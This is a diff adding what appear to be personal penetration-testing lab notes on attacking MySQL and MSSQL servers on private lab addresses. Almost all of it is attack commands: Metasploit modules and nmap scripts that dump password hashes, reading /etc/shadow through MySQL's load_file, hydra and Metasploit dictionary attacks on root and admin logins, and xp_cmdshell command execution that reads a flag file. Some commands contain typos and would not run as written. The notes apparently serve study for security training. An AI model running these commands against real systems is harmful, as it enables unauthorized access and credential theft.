@@ -424,6 +424,124 @@ run
 
 curl http://192.168.43.2/cgi-bin/ | more  // cgi-bin need to find msfconsole the file name might be diffrent
 
+------------------------------------------------------------------------------------------------------------------------------
+mysql
+
+mysql -h 192.168.234.3 -u root
+show databases;
+use books;
+select count(*)from authors;
+select * from authors;
+
+
+msfconsole
+use auxiliary/scanner/mysql/mysql_writable_dirs
+options
+set dir_list /usr/share/metasploit-framework/data/wordlist/directory.txt
+setg RHOSTS 192.168.234.3
+set verbose false
+advanced
+set password ""
+options
+run
+
+
+use auxiliary/scanner/mysql/mysql_hashdump
+options
+set username root
+set password ""
+options
+run
+
+mysql -h 192.168.250.3 -u root
+select load_file("/etc/shadow")
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-empty-password
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-info
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root', mysqlpass=''"
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root', mysqlpass=''"
+
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',
+mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
+
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
+nmap 192.168.34.3 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',
+password=''"
+
+
+mysql dictionary attack
+----------------------
+
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.3.3
+set pass_file/usr/share/metasploit-framework/data/wordlists/unix_pass.txt
+set verbose false
+set stop_on_success true
+set username root
+run
+
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt 192.168.34.3 mysql
+
+nmap -p 1433 --script ms-sql-info 192.168.4.3
+
+nmap -p 1433 --script ms-sql-ntlm-info --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt
+,passdb=/root/Desktop/wordlist/100-common-passwords.txt 192.168.4.3 
+
+nmap -p 1433 --script ms-sql-empty-password 192.168.4.3
+
+nmap 10.4.25.137 -p 1433 --script ms-sql-query --script-args mssql.unsername=admin,mssql.password=anamaria,ms-sql-query.query
+"SELECT *FROM master..syslogins" -oN output.txt
+
+
+nmap 10.10.34.3 -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
+nmap 10.4.25.3 -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin, mssql.password=anamaria, ms-sql-cmdshell.cmd
+="ipconfig"
+
+nmap 10.4.25.3 -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin, mssql.password=anamaria, ms-sql-cmdshell.cmd
+="type c:\flag.txt"
+
+nmap -sV -p1433--script mssql-sql-info 10.23.21.2
+msfconsole
+use auxiliary/scanner/mssql/mssql_login
+setg RHOSTS 10.45.33.2
+set user_file /root/Desktop/wordlist/common_users.txt
+set pass_file /root/Desktop/wordlist/100-common-passwordds.txt
+set verbose false
+option
+run
+
+
+use auxiliary/scanner/mssql/mssql_enum
+option
+run
+use auxiliary/scanner/admin/mssql/mssql_enum_sql_logins
+exploit
+use auxiliary/scanner/admin/mssql/mssql_exec
+set cmd whoami
+option
+run
+
+use auxiliary/scanner/admin/mssql/mssql_enum_domain_accounts
+run
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
